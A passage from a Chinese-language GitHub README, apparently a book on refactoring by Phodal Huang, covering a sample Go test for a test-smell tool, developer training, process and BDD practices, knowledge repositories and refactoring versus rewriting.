&lt;p&gt;于是，我可以写出我的第一个测试：&lt;/p&gt;
&lt;div class="highlight highlight-source-java"&gt;&lt;pre&gt;func TestTbsApp_EmptyTest(t &lt;span class="pl-k"&gt;*&lt;/span&gt;&lt;span class="pl-smi"&gt;testing&lt;span class="pl-k"&gt;.&lt;/span&gt;T&lt;/span&gt;) {
	g &lt;span class="pl-k"&gt;:&lt;/span&gt;&lt;span class="pl-k"&gt;=&lt;/span&gt; NewGomegaWithT(t)
	var codePath &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;../../../_fixtures/tbs/code/EmptyTest.java&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;

	var result &lt;span class="pl-k"&gt;=&lt;/span&gt; buildTbsResult(codePath)

	&lt;span class="pl-smi"&gt;g&lt;span class="pl-k"&gt;.&lt;/span&gt;Expect&lt;/span&gt;(result[&lt;span class="pl-c1"&gt;0&lt;/span&gt;]&lt;span class="pl-k"&gt;.&lt;/span&gt;&lt;span class="pl-smi"&gt;Type&lt;/span&gt;)&lt;span class="pl-k"&gt;.&lt;/span&gt;To(Equal(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;EmptyTest&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;))
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对应的一步步完成出整个功能的代码。而后，我们就可以重构出理想的代码 —— 因为我们已经有了对应的测试。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-完善基础设施" class="anchor" aria-hidden="true" href="#完善基础设施"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;完善基础设施&lt;/h3&gt;
&lt;h2&gt;&lt;a id="user-content-重构之后解决人的问题" class="anchor" aria-hidden="true" href="#重构之后解决人的问题"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构之后：解决人的问题&lt;/h2&gt;
&lt;p&gt;我们把所有的问题都归到人的问题。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-代码写得烂" class="anchor" aria-hidden="true" href="#代码写得烂"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;代码写得烂&lt;/h3&gt;
&lt;p&gt;如我们所见，我们在不同的公司里，会看到不同的人写出来的代码水平是不一样的。比如有一些是由供应商写的代码&lt;/p&gt;
&lt;p&gt;不过，既然给这引起供应商的工资本身就不高，那么怎么能指望出他/她写出好的代码。&lt;/p&gt;
&lt;p&gt;与此同时，由于种种原因，教他们学习的成本又特别高，甚至于你还要担心如果你教会了供应商，他/她们可能寻找一个新的工作。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-养成优秀的开发习惯" class="anchor" aria-hidden="true" href="#养成优秀的开发习惯"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;养成优秀的开发习惯&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-人员能力提升" class="anchor" aria-hidden="true" href="#人员能力提升"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;人员能力提升&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-练习项目" class="anchor" aria-hidden="true" href="#练习项目"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;练习项目&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-培训教程" class="anchor" aria-hidden="true" href="#培训教程"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;培训教程&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-典型问题" class="anchor" aria-hidden="true" href="#典型问题"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;典型问题&lt;/h4&gt;
&lt;h2&gt;&lt;a id="user-content-重构之后流程的问题" class="anchor" aria-hidden="true" href="#重构之后流程的问题"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构之后：流程的问题&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-流程优化" class="anchor" aria-hidden="true" href="#流程优化"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;流程优化&lt;/h3&gt;
&lt;p&gt;我们在开发的前期缺少对于系统的设计，那么我们将需要花费大量的成本在后期修复他们。&lt;/p&gt;
&lt;p&gt;你可以查看我先前写的《&lt;a href="https://www.phodal.com/blog/new-project-check-lists/" rel="nofollow"&gt;新项目检查清单&lt;/a&gt;》完善项目的启动流程，通过 &lt;a href="https://phodal.github.io/new-project-checklist/" rel="nofollow"&gt;https://phodal.github.io/new-project-checklist/&lt;/a&gt; 可以使用这个工具。并借助于《&lt;a href="https://www.phodal.com/blog/how-to-create-application-boilerplate/" rel="nofollow"&gt;如何创建你的应用脚手架&lt;/a&gt;》搭建好项目的脚手架。&lt;/p&gt;
&lt;p&gt;借助于 Path to Production &lt;a href="https://www.phodal.com/blog/tech-lead-tools-path-to-production/" rel="nofollow"&gt;优化你的上线流程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/path-to-production.png"&gt;&lt;img src="images/path-to-production.png" alt="Path to Production" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;工具见：&lt;a href="https://phodal.github.io/path/" rel="nofollow"&gt;https://phodal.github.io/path/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;你可以在我的 Tech Lead 工具箱中，获得更多工具：&lt;a href="https://github.com/phodal/techlead"&gt;https://github.com/phodal/techlead&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-需求规范化" class="anchor" aria-hidden="true" href="#需求规范化"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;需求规范化&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-实例化需求" class="anchor" aria-hidden="true" href="#实例化需求"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;实例化需求&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-行为驱动开发bdd" class="anchor" aria-hidden="true" href="#行为驱动开发bdd"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;行为驱动开发（BDD）&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;行为驱动开发是一种敏捷软件开发的技术，它鼓励软件项目中的开发者、QA 和非技术人员或商业参与者之间的协作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;年轻的时候（我刚毕业），我并不懂得 BDD 的好处——相当的繁琐，到了现在我又有一番不一样的体会。思来想去主要的原因是，当时我们是一个全功能的团队，不存在跨部门协作，也因此我并不觉得 BDD 能为我们带来多大的好处。&lt;/p&gt;
&lt;p&gt;可是在 ThoughtWorks 公司之外，开发、测试和业务都是各自的部门，有着各自的利益。通过 BDD 的协作方式，可以让交付物有一个一致的观点。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-重构之后提炼知识" class="anchor" aria-hidden="true" href="#重构之后提炼知识"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构之后：提炼知识&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-知识仓库" class="anchor" aria-hidden="true" href="#知识仓库"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;知识仓库&lt;/h3&gt;
&lt;p&gt;预先设计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一无是处的代码注释。&lt;/li&gt;
&lt;li&gt;没有搭建信息的 README。&lt;/li&gt;
&lt;li&gt;没有版本化的、二进制的项目文档&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-重建知识仓库" class="anchor" aria-hidden="true" href="#重建知识仓库"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重建知识仓库&lt;/h3&gt;
&lt;p&gt;请参考：&lt;a href="https://github.com/phodal/trusted"&gt;构建可信软件系统&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-问题是什么" class="anchor" aria-hidden="true" href="#问题是什么"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;问题是什么？&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-为什么我们需要重构" class="anchor" aria-hidden="true" href="#为什么我们需要重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;为什么我们需要重构？&lt;/h3&gt;
&lt;p&gt;这个问题，就该你回答了：为什么我们需要重构？&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-重构到微服务" class="anchor" aria-hidden="true" href="#重构到微服务"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构到微服务&lt;/h2&gt;
&lt;p&gt;重构比重写来得更有价值。重写往往有可能带来更多的技术债，还可能犯上同样的错误。&lt;/p&gt;
&lt;p&gt;你为什么不重写呢？？？&lt;/p&gt;
&lt;p&gt;这样更省时间？&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-未来" class="anchor" aria-hidden="true" href="#未来"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;未来&lt;/h2&gt;
&lt;p&gt;未来 10 年，你应当：&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-追求技术卓越" class="anchor" aria-hidden="true" href="#追求技术卓越"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;追求技术卓越。&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-推动个人变革进而引领组织变革" class="anchor" aria-hidden="true" href="#推动个人变革进而引领组织变革"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;推动个人变革，进而引领组织变革&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-整理知识加强教育" class="anchor" aria-hidden="true" href="#整理知识加强教育"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;整理知识，加强教育&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-在整个流程中将价值创造最大化" class="anchor" aria-hidden="true" href="#在整个流程中将价值创造最大化"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;在整个流程中将价值创造最大化&lt;/h3&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;LICENSE&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://www.phodal.com/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c07fb794f20aa2c7c99410788f61be23d4acb9e1/687474703a2f2f6272616e642e70686f64616c2e636f6d2f736869656c64732f626f6f6b2d736d616c6c2e737667" alt="Phodal's Book" data-canonical-src="http://brand.phodal.com/shields/book-small.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;© 2020 &lt;a href="https://www.phodal.com" rel="nofollow"&gt;Phodal Huang&lt;/a&gt;. This code is distributed under the Creative Commons Attribution-Noncommercial-No Derivative Works 4.0  License. See &lt;code&gt;LICENSE&lt;/code&gt; in this directory.&lt;/p&gt;
